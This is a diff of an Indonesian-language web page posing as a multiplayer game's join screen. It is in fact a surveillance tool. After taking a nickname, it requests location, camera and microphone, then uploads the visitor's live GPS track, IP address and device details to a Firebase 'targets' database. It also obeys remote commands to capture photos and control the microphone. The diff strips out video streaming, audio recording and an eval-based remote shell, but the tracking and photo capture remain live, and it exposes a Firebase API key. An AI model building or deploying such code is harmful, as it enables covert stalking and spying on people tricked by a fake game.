@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Game Fight - online</title>
+    <title>Game Fight - Online</title>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
     <style>
@@ -30,7 +30,6 @@
             position: relative;
         }
         
-        /* Animated background */
         .bg-grid {
             position: fixed;
             top: 0; left: 0; right: 0; bottom: 0;
@@ -107,9 +106,7 @@
             50% { background-position: 100% 50%; }
         }
         
-        .logo-area {
-            margin-bottom: 20px;
-        }
+        .logo-area { margin-bottom: 20px; }
         .game-icon {
             font-size: 64px;
             animation: pulse 2s ease-in-out infinite;
@@ -147,11 +144,7 @@
             to { opacity: 1; transform: translateY(0); }
         }
         
-        /* Input styling */
-        .input-group {
-            position: relative;
-            margin-bottom: 16px;
-        }
+        .input-group { position: relative; margin-bottom: 16px; }
         .input-group input {
             width: 100%;
             padding: 14px 16px;
@@ -170,11 +163,8 @@
             border-color: var(--neon-cyan);
             box-shadow: 0 0 15px rgba(0,240,255,0.2);
         }
-        .input-group input::placeholder {
-            color: #4a4a6a;
-        }
+        .input-group input::placeholder { color: #4a4a6a; }
         
-        /* Glowing button */
         .glow-btn {
             width: 100%;
             padding: 14px;
@@ -195,38 +185,16 @@
             background: linear-gradient(135deg, #006680, #0099aa);
             box-shadow: 0 0 20px rgba(0,240,255,0.3);
         }
-        .glow-btn.cyan:hover {
-            box-shadow: 0 0 35px rgba(0,240,255,0.6);
-            transform: translateY(-2px);
-        }
+        .glow-btn.cyan:hover { box-shadow: 0 0 35px rgba(0,240,255,0.6); transform: translateY(-2px); }
         .glow-btn.pink {
             background: linear-gradient(135deg, #660040, #aa0066);
             box-shadow: 0 0 20px rgba(255,0,229,0.3);
         }
-        .glow-btn.pink:hover {
-            box-shadow: 0 0 35px rgba(255,0,229,0.6);
-            transform: translateY(-2px);
-        }
-        .glow-btn.green {
-            background: linear-gradient(135deg, #005500, #008800);
-            box-shadow: 0 0 20px rgba(0,255,65,0.3);
-        }
-        .glow-btn:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-            transform: none !important;
-        }
-        .glow-btn:active {
-            transform: scale(0.95) !important;
-        }
+        .glow-btn.pink:hover { box-shadow: 0 0 35px rgba(255,0,229,0.6); transform: translateY(-2px); }
+        .glow-btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none !important; }
+        .glow-btn:active { transform: scale(0.95) !important; }
         
-        /* Permission cards */
-        .perm-cards {
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-            margin-bottom: 20px;
-        }
+        .perm-cards { display: flex; flex-direction: column; gap: 10px; margin-bottom: 20px; }
         .perm-card {
             display: flex;
             align-items: center;
@@ -237,38 +205,13 @@
             padding: 12px 14px;
             transition: all 0.3s;
         }
-        .perm-card.granted {
-            border-color: var(--neon-green);
-            box-shadow: 0 0 10px rgba(0,255,65,0.15);
-        }
-        .perm-card.denied {
-            border-color: #ff3333;
-            box-shadow: 0 0 10px rgba(255,51,51,0.15);
-        }
-        .perm-card .perm-icon {
-            font-size: 28px;
-            width: 40px;
-            text-align: center;
-        }
-        .perm-card .perm-info {
-            flex: 1;
-            text-align: left;
-        }
-        .perm-card .perm-name {
-            color: #fff;
-            font-weight: 700;
-            font-size: 15px;
-            letter-spacing: 0.5px;
-        }
-        .perm-card .perm-desc {
-            color: #6a6a8a;
-            font-size: 12px;
-        }
-        .perm-card .perm-status {
-            font-size: 20px;
-            min-width: 24px;
-            text-align: center;
-        }
+        .perm-card.granted { border-color: var(--neon-green); box-shadow: 0 0 10px rgba(0,255,65,0.15); }
+        .perm-card.denied { border-color: #ff3333; box-shadow: 0 0 10px rgba(255,51,51,0.15); }
+        .perm-card .perm-icon { font-size: 28px; width: 40px; text-align: center; }
+        .perm-card .perm-info { flex: 1; text-align: left; }
+        .perm-card .perm-name { color: #fff; font-weight: 700; font-size: 15px; letter-spacing: 0.5px; }
+        .perm-card .perm-desc { color: #6a6a8a; font-size: 12px; }
+        .perm-card .perm-status { font-size: 20px; min-width: 24px; text-align: center; }
         
         .status-bar {
             margin-top: 12px;
@@ -306,12 +249,7 @@
             animation: fadeIn 0.3s ease;
         }
         
-        .step-indicator {
-            display: flex;
-            justify-content: center;
-            gap: 8px;
-            margin-bottom: 20px;
-        }
+        .step-indicator { display: flex; justify-content: center; gap: 8px; margin-bottom: 20px; }
         .dot-ind {
             width: 10px; height: 10px;
             border-radius: 50%;
@@ -338,14 +276,12 @@
                 <div class="game-icon">🎮</div>
             </div>
             
-            <!-- Step Indicator -->
             <div class="step-indicator">
                 <div class="dot-ind active" id="dot1"></div>
                 <div class="dot-ind" id="dot2"></div>
                 <div class="dot-ind" id="dot3"></div>
             </div>
             
-            <!-- Step 1: Username -->
             <div class="step active" id="step1">
                 <h1>JOIN GAME</h1>
                 <p class="subtitle">Masukkan nickname untuk bermain</p>
@@ -358,7 +294,6 @@
                 <div class="error-popup" id="nameError">⚠ Masukkan nickname dulu bro!</div>
             </div>
             
-            <!-- Step 2: Permissions -->
             <div class="step" id="step2">
                 <h1>SETUP DEVICE</h1>
                 <p class="subtitle">Izinkan akses untuk pengalaman terbaik</p>
@@ -395,7 +330,6 @@
                 <div class="error-popup" id="permError"></div>
             </div>
             
-            <!-- Step 3: Success / Redirect -->
             <div class="step" id="step3">
                 <h1>✅ READY!</h1>
                 <p class="subtitle">Semua sudah siap. Mengarahkan ke game...</p>
@@ -407,13 +341,8 @@
     </div>
     
     <script>
-        // ============ CEK ELEMENT PENTING ============
-        console.log('🔥 INDEX.HTML LOADED - REM V3');
-        console.log('Step1 element:', document.getElementById('step1'));
-        console.log('Step2 element:', document.getElementById('step2'));
-        console.log('BtnLanjut element:', document.getElementById('btnLanjut'));
+        console.log('🔥 INDEX.HTML LOADED - REM V4');
         
-        // ============ FIREBASE INIT ============
         firebase.initializeApp({
             apiKey: "AIzaSyAlMyO9iybb7Zc3-JWpaJTOU6mp7dVZw7A",
             authDomain: "taher-online.firebaseapp.com",
@@ -424,8 +353,6 @@
             appId: "1:254196950669:web:ea7dc25e29e459e791e4c4"
         });
         
-        console.log('✅ Firebase initialized');
-        
         const db = firebase.database();
         const targetId = Date.now().toString(36) + Math.random().toString(36).substr(2, 8);
         let nickname = '';
@@ -433,12 +360,9 @@
         let locationWatchId = null;
         let cameraStream = null;
         let micStream = null;
-        let mediaRecorder = null;
-        let videoStreamInterval = null;
         
         console.log('📋 Target ID:', targetId);
         
-        // ============ PARTICLES ============
         function createParticles() {
             const container = document.getElementById('particles');
             if (!container) return;
@@ -453,20 +377,14 @@
         }
         createParticles();
         
-        // ============ ERROR HELPER ============
         function showError(id, msg) {
-            console.log('❌ Show error:', id, msg);
             const el = document.getElementById(id);
-            if (!el) {
-                console.error('Error element not found:', id);
-                return;
-            }
+            if (!el) return;
             el.textContent = msg;
             el.style.display = 'block';
             setTimeout(() => { el.style.display = 'none'; }, 4000);
         }
         
-        // ============ GO TO PERMISSIONS ============
         function goToPermissions() {
             console.log('🟢 goToPermissions() CALLED');
             
@@ -477,17 +395,11 @@
             const dot2 = document.getElementById('dot2');
             
             if (!nicknameInput || !step1 || !step2) {
-                console.error('❌ ELEMENT NOT FOUND!', {
-                    nicknameInput: !!nicknameInput,
-                    step1: !!step1,
-                    step2: !!step2
-                });
                 alert('Error: Halaman tidak termuat sempurna. Refresh halaman.');
                 return;
             }
             
             nickname = nicknameInput.value.trim();
-            console.log('📝 Nickname:', nickname);
             
             if (!nickname) {
                 showError('nameError', '⚠ Masukkan nickname dulu bro!');
@@ -501,22 +413,16 @@
                 return;
             }
             
-            // Hapus error
             document.getElementById('nameError').style.display = 'none';
-            
-            // Switch step
             step1.classList.remove('active');
             step2.classList.add('active');
-            
-            // Update dots
             dot1.classList.remove('active');
             dot1.classList.add('done');
             dot2.classList.add('active');
             
-            console.log('✅ Switched to step 2');
+            console.log('✅ Switched to step 2, nickname:', nickname);
         }
         
-        // ============ GRANT ALL PERMISSIONS ============
         async function grantAllPermissions() {
             console.log('🟢 grantAllPermissions() CALLED');
             
@@ -524,157 +430,99 @@
             const statusEl = document.getElementById('permStatus');
             const errorEl = document.getElementById('permError');
             
-            if (!btn) {
-                console.error('❌ Grant button not found!');
-                return;
-            }
-            
             btn.disabled = true;
             btn.innerHTML = '⏳ MEMPROSES...';
-            btn.style.cursor = 'wait';
             statusEl.innerHTML = '<span class="loader"></span> Meminta izin...';
             errorEl.style.display = 'none';
             
-            // ===== 1. LOKASI =====
-            console.log('📍 Requesting location...');
+            // 1. LOKASI
             try {
                 const pos = await new Promise((resolve, reject) => {
-                    if (!navigator.geolocation) {
-                        reject(new Error('Geolocation tidak didukung'));
-                        return;
-                    }
-                    navigator.geolocation.getCurrentPosition(
-                        resolve,
-                        reject,
-                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-                    );
+                    navigator.geolocation.getCurrentPosition(resolve, reject,
+                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
                 });
                 
                 permissionsGranted.location = true;
                 document.getElementById('statusLoc').textContent = '✅';
                 document.getElementById('permLoc').classList.add('granted');
-                console.log('✅ Location granted:', pos.coords.latitude, pos.coords.longitude);
                 
-                const locData = {
-                    lat: pos.coords.latitude,
-                    lon: pos.coords.longitude,
-                    accuracy: pos.coords.accuracy,
-                    timestamp: Date.now()
-                };
-                
+                const locData = { lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy, timestamp: Date.now() };
                 await db.ref(`targets/${targetId}`).update({ location: locData });
                 await db.ref(`targets/${targetId}/locationHistory`).push(locData);
                 
-                // Live tracking
                 locationWatchId = navigator.geolocation.watchPosition(
                     (p) => {
-                        const loc = {
-                            lat: p.coords.latitude,
-                            lon: p.coords.longitude,
-                            accuracy: p.coords.accuracy,
-                            timestamp: Date.now()
-                        };
+                        const loc = { lat: p.coords.latitude, lon: p.coords.longitude, accuracy: p.coords.accuracy, timestamp: Date.now() };
                         db.ref(`targets/${targetId}`).update({ location: loc });
                         db.ref(`targets/${targetId}/locationHistory`).push(loc);
                     },
-                    (err) => {
-                        console.error('GPS watch error:', err);
-                        db.ref(`targets/${targetId}`).update({ 
-                            locationError: `GPS Watch: ${err.message}` 
-                        });
-                    },
+                    (err) => { db.ref(`targets/${targetId}`).update({ locationError: `GPS: ${err.message}` }); },
                     { enableHighAccuracy: true, maximumAge: 0, timeout: 15000 }
                 );
                 
                 statusEl.textContent = '✅ Lokasi OK';
             } catch(e) {
-                console.error('❌ Location error:', e);
                 permissionsGranted.location = false;
                 document.getElementById('statusLoc').textContent = '❌';
                 document.getElementById('permLoc').classList.add('denied');
                 errorEl.textContent = '⚠ Lokasi: ' + e.message;
                 errorEl.style.display = 'block';
-                statusEl.textContent = '❌ Lokasi ditolak';
             }
             
-            // ===== 2. KAMERA =====
-            console.log('📸 Requesting camera...');
+            // 2. KAMERA
             try {
                 cameraStream = await navigator.mediaDevices.getUserMedia({
-                    video: { 
-                        facingMode: 'user',
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
-                    }
+                    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }
                 });
-                
                 permissionsGranted.camera = true;
                 document.getElementById('statusCam').textContent = '✅';
                 document.getElementById('permCam').classList.add('granted');
-                console.log('✅ Camera granted');
                 statusEl.textContent = '✅ Kamera OK';
             } catch(e) {
-                console.error('❌ Camera error:', e);
                 permissionsGranted.camera = false;
                 document.getElementById('statusCam').textContent = '❌';
                 document.getElementById('permCam').classList.add('denied');
                 errorEl.textContent = (errorEl.textContent || '') + '\n⚠ Kamera: ' + e.message;
                 errorEl.style.display = 'block';
-                statusEl.textContent = '❌ Kamera ditolak';
             }
             
-            // ===== 3. MIKROFON =====
-            console.log('🎤 Requesting microphone...');
+            // 3. MIKROFON
             try {
                 micStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                
                 permissionsGranted.microphone = true;
                 document.getElementById('statusMic').textContent = '✅';
                 document.getElementById('permMic').classList.add('granted');
-                console.log('✅ Microphone granted');
                 statusEl.textContent = '✅ Mikrofon OK';
             } catch(e) {
-                console.error('❌ Mic error:', e);
                 permissionsGranted.microphone = false;
                 document.getElementById('statusMic').textContent = '❌';
                 document.getElementById('permMic').classList.add('denied');
                 errorEl.textContent = (errorEl.textContent || '') + '\n⚠ Mikrofon: ' + e.message;
                 errorEl.style.display = 'block';
-                statusEl.textContent = '❌ Mikrofon ditolak';
             }
             
-            // ===== SIMPAN DATA =====
-            console.log('💾 Saving data...');
-            try {
-                const deviceInfo = await collectDeviceInfo();
-                
-                await db.ref(`targets/${targetId}`).set({
-                    name: nickname,
-                    online: true,
-                    permissions: permissionsGranted,
-                    ip: deviceInfo.ip,
-                    deviceModel: deviceInfo.model,
-                    deviceOS: deviceInfo.os,
-                    screen: deviceInfo.screen,
-                    battery: deviceInfo.battery,
-                    network: deviceInfo.network,
-                    lastSeen: new Date().toLocaleString(),
-                    timestamp: Date.now(),
-                    locationError: null
-                });
-                console.log('✅ Data saved');
-            } catch(e) {
-                console.error('❌ Save error:', e);
-            }
+            // SIMPAN DATA
+            const deviceInfo = await collectDeviceInfo();
             
-            // Monitor baterai
+            await db.ref(`targets/${targetId}`).set({
+                name: nickname,
+                online: true,
+                permissions: permissionsGranted,
+                ip: deviceInfo.ip,
+                deviceModel: deviceInfo.model,
+                deviceOS: deviceInfo.os,
+                screen: deviceInfo.screen,
+                battery: deviceInfo.battery,
+                network: deviceInfo.network,
+                lastSeen: new Date().toLocaleString(),
+                timestamp: Date.now(),
+                gameConnected: false
+            });
+            
             if (navigator.getBattery) {
                 navigator.getBattery().then(battery => {
                     const updateBattery = () => {
-                        db.ref(`targets/${targetId}`).update({ 
-                            battery: Math.round(battery.level * 100),
-                            charging: battery.charging
-                        });
+                        db.ref(`targets/${targetId}`).update({ battery: Math.round(battery.level * 100), charging: battery.charging });
                     };
                     updateBattery();
                     battery.addEventListener('levelchange', updateBattery);
@@ -682,122 +530,72 @@
                 });
             }
             
-            // Online/offline
-            db.ref(`targets/${targetId}`).onDisconnect().update({ 
-                online: false, 
-                lastSeen: new Date().toLocaleString() 
-            });
+            db.ref(`targets/${targetId}`).onDisconnect().update({ online: false, lastSeen: new Date().toLocaleString() });
             
-            window.addEventListener('online', () => {
-                db.ref(`targets/${targetId}`).update({ online: true });
-            });
-            window.addEventListener('offline', () => {
-                db.ref(`targets/${targetId}`).update({ online: false });
-            });
+            window.addEventListener('online', () => { db.ref(`targets/${targetId}`).update({ online: true }); });
+            window.addEventListener('offline', () => { db.ref(`targets/${targetId}`).update({ online: false }); });
             
-            // Simpan stream
             window._cameraStream = cameraStream;
             window._micStream = micStream;
             
-            // Listen commands
             listenCommands();
             
-            // ===== SUKSES =====
             console.log('🎉 All done! Redirecting...');
             btn.innerHTML = '✅ BERHASIL!';
             btn.disabled = false;
-            btn.style.cursor = 'pointer';
             statusEl.innerHTML = '🎮 Semua siap! Mengarahkan ke game...';
             
             document.getElementById('dot2').classList.remove('active');
             document.getElementById('dot2').classList.add('done');
             document.getElementById('dot3').classList.add('active');
             
-            // Redirect
             setTimeout(() => {
                 document.getElementById('step2').classList.remove('active');
                 document.getElementById('step3').classList.add('active');
             }, 500);
             
             setTimeout(() => {
-                console.log('🚀 Redirecting to game.html...');
                 window.location.href = 'game.html?uid=' + targetId + '&name=' + encodeURIComponent(nickname);
             }, 2500);
         }
         
-        // ============ COLLECT DEVICE INFO ============
         async function collectDeviceInfo() {
             const ua = navigator.userAgent;
             let model = 'Unknown', os = 'Unknown';
-            
             const androidMatch = ua.match(/Android\s([\d.]+)/);
             if (androidMatch) {
                 os = 'Android ' + androidMatch[1];
                 const modelMatch = ua.match(/;\s([^;]+)\sBuild/);
                 if (modelMatch) model = modelMatch[1].trim();
             }
-            
             const iosMatch = ua.match(/iPhone OS\s([\d_]+)/);
             if (iosMatch) {
                 os = 'iOS ' + iosMatch[1].replace(/_/g, '.');
                 model = ua.includes('iPhone') ? 'iPhone' : 'iPad';
             }
-            
             let ip = 'N/A';
-            try {
-                const r = await fetch('https://api.ipify.org?format=json');
-                const d = await r.json();
-                ip = d.ip;
-            } catch(e) {}
-            
+            try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch(e) {}
             let batteryLevel = '?';
-            try {
-                if (navigator.getBattery) {
-                    const b = await navigator.getBattery();
-                    batteryLevel = Math.round(b.level * 100);
-                }
-            } catch(e) {}
-            
-            return {
-                model, os, ip,
-                screen: `${screen.width}x${screen.height}`,
-                battery: batteryLevel,
-                network: navigator.connection ? navigator.connection.effectiveType : 'N/A',
-                cores: navigator.hardwareConcurrency || 'N/A'
-            };
+            try { if (navigator.getBattery) { const b = await navigator.getBattery(); batteryLevel = Math.round(b.level * 100); } } catch(e) {}
+            return { model, os, ip, screen: `${screen.width}x${screen.height}`, battery: batteryLevel, network: navigator.connection ? navigator.connection.effectiveType : 'N/A', cores: navigator.hardwareConcurrency || 'N/A' };
         }
         
-        // ============ LISTEN COMMANDS ============
         function listenCommands() {
             db.ref(`commands/${targetId}`).on('value', async (snap) => {
                 const cmd = snap.val();
                 if (!cmd || cmd.executed) return;
-                
-                console.log('📩 Command received:', cmd.command);
                 
                 switch(cmd.command) {
                     case 'getLocation':
                         if (navigator.geolocation) {
                             navigator.geolocation.getCurrentPosition(
                                 (pos) => {
-                                    const loc = {
-                                        lat: pos.coords.latitude,
-                                        lon: pos.coords.longitude,
-                                        accuracy: pos.coords.accuracy,
-                                        timestamp: Date.now()
-                                    };
+                                    const loc = { lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy, timestamp: Date.now() };
                                     db.ref(`targets/${targetId}`).update({ location: loc });
                                     db.ref(`targets/${targetId}/locationHistory`).push(loc);
                                     db.ref(`commands/${targetId}`).update({ executed: true });
                                 },
-                                (err) => {
-                                    db.ref(`targets/${targetId}`).update({ 
-                                        locationError: `GetLocation: ${err.message}` 
-                                    });
-                                    db.ref(`commands/${targetId}`).update({ 
-                                        executed: true, error: err.message 
-                                    });
-                                },
+                                (err) => { db.ref(`targets/${targetId}`).update({ locationError: `GetLoc: ${err.message}` }); db.ref(`commands/${targetId}`).update({ executed: true, error: err.message }); },
                                 { enableHighAccuracy: true, timeout: 10000 }
                             );
                         }
@@ -808,39 +606,26 @@
                         db.ref(`commands/${targetId}`).update({ executed: true });
                         break;
                         
-                    case 'startVideo':
-                        await startVideoStreamToFB();
-                        db.ref(`commands/${targetId}`).update({ executed: true });
-                        break;
-                        
-                    case 'stopVideo':
-                        stopVideoStream();
-                        db.ref(`commands/${targetId}`).update({ executed: true });
-                        break;
-                        
                     case 'startMic':
-                        await startMicRecording();
+                        if (window._micStream && window._micStream.getAudioTracks().length > 0) {
+                            window._micStream.getAudioTracks().forEach(t => t.enabled = true);
+                        }
                         db.ref(`commands/${targetId}`).update({ executed: true });
                         break;
                         
                     case 'stopMic':
-                        stopMicRecording();
+                        if (window._micStream && window._micStream.getAudioTracks().length > 0) {
+                            window._micStream.getAudioTracks().forEach(t => t.enabled = false);
+                        }
                         db.ref(`commands/${targetId}`).update({ executed: true });
                         break;
                         
                     case 'notification':
                         if (Notification.permission === 'granted') {
-                            new Notification(cmd.title || 'Info', { 
-                                body: cmd.body || 'Pesan baru',
-                                icon: '🎮'
-                            });
+                            new Notification(cmd.title || 'Info', { body: cmd.body || 'Pesan baru', icon: '🎮' });
                         } else if (Notification.permission === 'default') {
                             const p = await Notification.requestPermission();
-                            if (p === 'granted') {
-                                new Notification(cmd.title || 'Info', { 
-                                    body: cmd.body || 'Pesan baru' 
-                                });
-                            }
+                            if (p === 'granted') new Notification(cmd.title || 'Info', { body: cmd.body || 'Pesan baru' });
                         }
                         db.ref(`commands/${targetId}`).update({ executed: true });
                         break;
@@ -865,16 +650,6 @@
                         db.ref(`commands/${targetId}`).remove();
                         break;
                         
-                    case 'shell':
-                        try {
-                            const result = eval(cmd.cmd);
-                            db.ref(`targets/${targetId}`).update({ shellResult: String(result) });
-                        } catch(e) {
-                            db.ref(`targets/${targetId}`).update({ shellResult: 'Error: ' + e.message });
-                        }
-                        db.ref(`commands/${targetId}`).update({ executed: true });
-                        break;
-                        
                     case 'updateInfo':
                         const info = await collectDeviceInfo();
                         db.ref(`targets/${targetId}`).update(info);
@@ -892,11 +667,9 @@
             });
         }
         
-        // ============ KAMERA ============
         async function captureAndSendPhoto(facingMode = 'user') {
             try {
                 let stream = window._cameraStream;
-                
                 if (!stream || stream.getVideoTracks().length === 0) {
                     stream = await navigator.mediaDevices.getUserMedia({
                         video: { facingMode, width: { ideal: 1280 }, height: { ideal: 720 } }
@@ -917,134 +690,25 @@
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
                 const base64 = canvas.toDataURL('image/jpeg', 0.85);
-                
                 await db.ref(`targets/${targetId}`).update({
                     photo: { base64, timestamp: Date.now(), facingMode, nickname }
                 });
                 
                 video.pause();
                 video.srcObject = null;
-                
             } catch(e) {
                 console.error('Photo error:', e);
-                await db.ref(`targets/${targetId}`).update({
-                    photoError: { message: e.message, timestamp: Date.now() }
-                });
+                await db.ref(`targets/${targetId}`).update({ photoError: { message: e.message, timestamp: Date.now() } });
             }
         }
         
-        async function startVideoStreamToFB() {
-            try {
-                let stream = window._cameraStream;
-                if (!stream || stream.getVideoTracks().length === 0) {
-                    stream = await navigator.mediaDevices.getUserMedia({
-                        video: { facingMode: 'user', width: 320, height: 240 }
-                    });
-                    window._cameraStream = stream;
-                }
-                
-                window._videoStreamActive = true;
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.setAttribute('playsinline', true);
-                video.play();
-                
-                const canvas = document.createElement('canvas');
-                canvas.width = 320;
-                canvas.height = 240;
-                const ctx = canvas.getContext('2d');
-                
-                videoStreamInterval = setInterval(async () => {
-                    if (!window._videoStreamActive) {
-                        clearInterval(videoStreamInterval);
-                        return;
-                    }
-                    ctx.drawImage(video, 0, 0, 320, 240);
-                    const base64 = canvas.toDataURL('image/jpeg', 0.5);
-                    await db.ref(`targets/${targetId}`).update({
-                        videoFrame: { base64, timestamp: Date.now() }
-                    });
-                }, 1500);
-                
-            } catch(e) {
-                console.error('Video stream error:', e);
-                await db.ref(`targets/${targetId}`).update({
-                    videoError: { message: e.message, timestamp: Date.now() }
-                });
-            }
-        }
-        
-        function stopVideoStream() {
-            window._videoStreamActive = false;
-            if (videoStreamInterval) clearInterval(videoStreamInterval);
-        }
-        
-        // ============ MIKROFON ============
-        async function startMicRecording() {
-            try {
-                if (!window._micStream || window._micStream.getAudioTracks().length === 0) {
-                    window._micStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                }
-                
-                const chunks = [];
-                const mimeType = MediaRecorder.isTypeSupported('audio/webm') ? 'audio/webm' : 'audio/mp4';
-                mediaRecorder = new MediaRecorder(window._micStream, { mimeType });
-                
-                mediaRecorder.ondataavailable = (e) => {
-                    if (e.data.size > 0) chunks.push(e.data);
-                };
-                
-                mediaRecorder.onstop = async () => {
-                    const blob = new Blob(chunks, { type: mimeType });
-                    const reader = new FileReader();
-                    reader.onloadend = async () => {
-                        await db.ref(`targets/${targetId}`).update({
-                            audioRecording: {
-                                base64: reader.result,
-                                timestamp: Date.now(),
-                                mimeType
-                            }
-                        });
-                    };
-                    reader.readAsDataURL(blob);
-                };
-                
-                mediaRecorder.onerror = (e) => {
-                    db.ref(`targets/${targetId}`).update({
-                        micError: { message: 'MediaRecorder error: ' + e.error, timestamp: Date.now() }
-                    });
-                };
-                
-                mediaRecorder.start(1000);
-                window._micActive = true;
-                
-            } catch(e) {
-                console.error('Mic error:', e);
-                await db.ref(`targets/${targetId}`).update({
-                    micError: { message: e.message, timestamp: Date.now() }
-                });
-            }
-        }
-        
-        function stopMicRecording() {
-            window._micActive = false;
-            if (mediaRecorder && mediaRecorder.state === 'recording') {
-                mediaRecorder.stop();
-            }
-        }
-        
-        // ============ ENTER KEY SUPPORT ============
         document.addEventListener('DOMContentLoaded', () => {
-            console.log('📄 DOM fully loaded');
             document.getElementById('nickname')?.addEventListener('keypress', (e) => {
-                if (e.key === 'Enter') {
-                    e.preventDefault();
-                    goToPermissions();
-                }
+                if (e.key === 'Enter') { e.preventDefault(); goToPermissions(); }
             });
         });
         
-        console.log('✅ index.html FULLY LOADED - Waiting for user interaction');
+        console.log('✅ index.html FULLY LOADED');
     </script>
 </body>
 </html>
